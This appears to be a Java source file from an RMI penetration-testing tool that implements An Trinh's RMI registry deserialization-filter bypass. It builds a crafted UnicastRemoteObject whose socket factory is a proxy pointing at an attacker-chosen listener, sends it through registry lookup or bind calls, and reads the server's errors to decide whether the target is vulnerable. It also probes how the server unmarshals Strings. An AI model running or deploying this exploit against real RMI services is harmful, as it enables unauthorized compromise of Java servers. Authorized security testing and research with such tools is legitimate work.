package de.qtc.rmg.operations;

import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.rmi.server.ObjID;
import java.rmi.server.RMIClientSocketFactory;
import java.rmi.server.RMIServerSocketFactory;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.rmi.server.UnicastRemoteObject;

import de.qtc.rmg.io.Logger;
import de.qtc.rmg.io.MaliciousOutputStream;
import de.qtc.rmg.networking.DummySocketFactory;
import de.qtc.rmg.utils.RMGUtils;
import de.qtc.rmg.utils.RMIWhisperer;
import sun.rmi.server.UnicastRef;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.StreamRemoteCall;
import sun.rmi.transport.tcp.TCPEndpoint;

/*
 * The bypass technique implemented by this code was discovered by An Trinh (@_tint0) and a detailed analysis was
 * provided by Hans-Martin Münch (@h0ng10). Certain portions of the code were copied from the corresponding blog post:
 * https://mogwailabs.de/de/blog/2020/02/an-trinhs-rmi-registry-bypass/
 */
@SuppressWarnings("restriction")
public class RegistryClient {

    private RMIWhisperer rmi;

    private Field ssfField;
    private Field enableReplaceField;
    private Constructor<?> constructor;

    private static final long interfaceHash = 4905912898345647071L;
    private static final String[] callNames = new String[] {"bind", "list", "lookup", "rebind", "unbind"};

    public RegistryClient(RMIWhisperer rmiRegistry)
    {
        this.rmi = rmiRegistry;

        try {
            constructor = UnicastRemoteObject.class.getDeclaredConstructor(int.class, RMIClientSocketFactory.class, RMIServerSocketFactory.class);
            constructor.setAccessible(true);

            ssfField = UnicastRemoteObject.class.getDeclaredField("ssf");
            ssfField.setAccessible(true);

            enableReplaceField = ObjectOutputStream.class.getDeclaredField("enableReplace");
            enableReplaceField.setAccessible(true);

        } catch(NoSuchMethodException | SecurityException | NoSuchFieldException e) {
            Logger.eprintlnMixedYellow("Unexpected Exception caught during", "RegistryClient", "instantiation.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }
    }

    /**
     * Determines how the String type is umarshalled by the remote server. Sends an java.lang.Integer as argument
     * for the lookup(String name) call. If the String type is read via 'readObject', this will lead to an deserialization
     * attempt of the location, which is set to an unknown object (DefinitelyNonExistingClass). If this class name
     * appears in the server exception, we know that 'readObject' is used.
     */
    public void enumerateStringMarshalling()
    {
        Logger.printlnBlue("RMI server String unmarshalling enumeration:");
        Logger.println("");
        Logger.increaseIndent();

        try {
            lookupCall(0, true);

        } catch( java.rmi.ServerException e ) {

            Throwable t = RMGUtils.getCause(e);
            if( t instanceof ClassNotFoundException && t.getMessage().contains("de.qtc.rmg.utils.DefinitelyNonExistingClass")) {
                Logger.printlnMixedBlue("- Server", "attempted to deserialize", "object locations during lookup call.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readObject().");
                RMGUtils.showStackTrace(e);

            } else if( t instanceof ClassCastException && t.getMessage().contains("Cannot cast an object to java.lang.String")) {
                Logger.printlnMixedBlue("- Server complained that", "object cannot be casted to java.lang.String.");
                Logger.printMixedBlue("  --> The type", "java.lang.String", "is unmarshalled via ");
                Logger.printlnPlainYellow("readString().");
                RMGUtils.showStackTrace(e);

            } else {
                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
                Logger.println("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during lookup call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } finally {
            Logger.decreaseIndent();
        }

    }
    public void invokeAnTrinhBypass(String host, int port, boolean local)
    {
        String callName = "";
        Object payloadObject = null;

        try {
            payloadObject = generateBypassObject(host, port);

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during generateBypassObject call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }

        try {
            if( !local ) {
                callName = callNames[2];
                lookupCall(payloadObject);
            } else {
                callName = callNames[0];
                bindCall(payloadObject);
            }

        } catch(java.rmi.ConnectException e) {
            Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ConnectIOException e) {
            Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during " + callName + " call.");
            Logger.eprintlnMixedBlue("Remote endpoint probably uses an", "SSL socket");
            Logger.eprintlnMixedYellow("Retry with the", "--ssl", "option.");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();

        } catch(java.rmi.ServerException e) {

            Throwable cause = RMGUtils.getCause(e);
            if( cause instanceof java.rmi.AccessException && cause.getMessage().contains("is non-local host")) {
                Logger.eprintMixedYellow("Caught", "AccessException", "during " + callName + " call.");
                Logger.printlnPlainMixedBlue(" Deserialization filter bypass", "failed.");

                if( local ) {
                    Logger.eprintMixedYellow("Notice: With", "--local", "the bypass usually only works from ");
                    Logger.printlnPlainBlue("localhost.");
                }

                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( cause instanceof java.lang.ClassCastException && cause.getMessage().contains("Cannot cast an object to java.lang.String")) {
                Logger.eprintlnMixedYellow("Caught", "ClassCastException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("RMI server treats Strings specially during deserialization", "(patched).");
                Logger.eprintlnMixedYellow("Bypass could still work locally using the", "--local", "option.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( cause instanceof java.rmi.RemoteException && cause.getMessage().contains("Method is not Remote")) {
                Logger.eprintlnMixedYellow("Caught", "RemoteException", "during " + callName + " call.");
                Logger.eprintMixedBlue("Deserialization filter bypass", "failed.", "The targeted server");
                Logger.printlnPlainYellow(" is probably patched.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( cause instanceof java.io.EOFException ) {
                Logger.eprintlnMixedYellow("Caught", "EOFException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("This usually occurs when the bypass succeed, but the listener", "is not answering properly.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( cause instanceof java.rmi.ConnectIOException && cause.getMessage().contains("non-JRMP server at remote endpoint")) {
                Logger.eprintlnMixedYellow("Caught", "ConnectIOException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("This usually occurs when the bypass succeed, but the listener", "is not answering properly.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( cause instanceof java.net.ConnectException && cause.getMessage().contains("Connection refused")) {
                Logger.eprintlnMixedYellow("Caught", "ConnectException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("Bypass", "was successful", "but the specified listener did not accept the connection.");
                Logger.eprintlnMixedYellow("Have you typed the listener address correctly? The target", "should be vulnerable.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( cause instanceof java.net.ConnectException && cause.getMessage().contains("Connection timed out")) {
                Logger.eprintlnMixedYellow("Caught", "ConnectException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("Bypass", "was successful", "but the target could not reach the specified listener.");
                Logger.eprintlnMixedYellow("Have you typed the listener address correctly? The target", "should be vulnerable.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + callName + " call.");
                Logger.println("Please report this to improve rmg :)");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch( Exception e ) {
            Logger.printlnMixedYellow("Caught unexpected", e.getClass().getName(), "during " + callName + " call.");
            Logger.println("Please report this to improve rmg :)");
            RMGUtils.stackTrace(e);
            RMGUtils.exit();
        }

        Logger.printlnMixedBlue("Caught", "no Exception", "during " + callName + " call.");
        Logger.printlnMixedYellow("Deserialization filter bypass", "probably worked :)");
    }

    public Object generateBypassObject(String host, int port) throws Exception
    {
        TCPEndpoint endpoint = new TCPEndpoint(host, port);
        UnicastRef refObject = new UnicastRef(new LiveRef(new ObjID(123), endpoint, false));

        RemoteObjectInvocationHandler payloadInvocationHandler = new RemoteObjectInvocationHandler(refObject);
        RMIServerSocketFactory proxySSF = (RMIServerSocketFactory) Proxy.newProxyInstance(
            RMIServerSocketFactory.class.getClassLoader(),
            new Class[] { RMIServerSocketFactory.class, java.rmi.Remote.class },
            payloadInvocationHandler);

        UnicastRemoteObject payloadObject = null;
        payloadObject = (UnicastRemoteObject)constructor.newInstance(new Object[]{0, null, new DummySocketFactory()});
        UnicastRemoteObject.unexportObject(payloadObject, true);

        ssfField.set(payloadObject, proxySSF);
        return payloadObject;
    }

    public void bindCall(Object payloadObject) throws Exception
    {
        Object[] callArguments = new Object[] {"Bypass incomming...", payloadObject};
        genericCall(0, callArguments);
    }

    public void lookupCall(Object payloadObject) throws Exception
    {
        Object[] callArguments = new Object[] {payloadObject};
        genericCall(2, callArguments);
    }

    public void bindCall(Object payloadObject, boolean maliciousStream) throws Exception
    {
        Object[] callArguments = new Object[] {"Bypass incomming...", payloadObject};
        genericCall(0, callArguments, maliciousStream);
    }

    public void lookupCall(Object payloadObject, boolean maliciousStream) throws Exception
    {
        Object[] callArguments = new Object[] {payloadObject};
        genericCall(2, callArguments, maliciousStream);
    }

    public void genericCall(int callID, Object[] callArguments) throws Exception
    {
        genericCall(callID, callArguments, false);
    }

    @SuppressWarnings("deprecation")
    public void genericCall(int callID, Object[] callArguments, boolean maliciousStream) throws Exception
    {
        String callName = callNames[callID];

        try {
            Endpoint endpoint = rmi.getEndpoint();
            RemoteRef remoteRef = new UnicastRef(new LiveRef(new ObjID(ObjID.REGISTRY_ID), endpoint, false));

            StreamRemoteCall call = (StreamRemoteCall)remoteRef.newCall(null, null, callID, interfaceHash);
            try {
                ObjectOutputStream out = (ObjectOutputStream)call.getOutputStream();
                enableReplaceField.set(out, false);

                if(maliciousStream)
                    out = new MaliciousOutputStream(out);

                for(Object o : callArguments)
                    out.writeObject(o);

            } catch(java.io.IOException e) {
                throw new java.rmi.MarshalException("error marshalling arguments", e);
            }

            remoteRef.invoke(call);
            remoteRef.done(call);

        } catch(java.rmi.ConnectException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.ConnectException && t.getMessage().contains("Connection refused")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
                Logger.eprintMixedBlue("Target", "refused", "the connection.");
                Logger.printlnPlainMixedBlue(" The specified port is probably", "closed.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectException", "during " + callName + " call.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }

        } catch(java.rmi.ConnectIOException e) {

            Throwable t = RMGUtils.getCause(e);

            if( t instanceof java.net.NoRouteToHostException) {
                Logger.eprintlnMixedYellow("Caught unexpected", "NoRouteToHostException", "during " + callName + " call.");
                Logger.eprintln("Have you entered the correct target?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof java.rmi.ConnectIOException && t.getMessage().contains("non-JRMP server")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during " + callName + " call.");
                Logger.eprintMixedBlue("Remote endpoint is either", "no RMI endpoint", "or uses an");
                Logger.printlnPlainBlue(" SSL socket.");
                Logger.eprintlnMixedYellow("Retry the operation using the", "--ssl", "option.");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else if( t instanceof javax.net.ssl.SSLException && t.getMessage().contains("Unsupported or unrecognized SSL message")) {
                Logger.eprintlnMixedYellow("Caught unexpected", "SSLException", "during " + callName + " call.");
                Logger.eprintlnMixedBlue("You probably used", "--ssl", "on a plaintext connection?");
                RMGUtils.showStackTrace(e);
                RMGUtils.exit();

            } else {
                Logger.eprintlnMixedYellow("Caught unexpected", "ConnectIOException", "during " + callName + " call.");
                RMGUtils.stackTrace(e);
                RMGUtils.exit();
            }
        }
    }
}
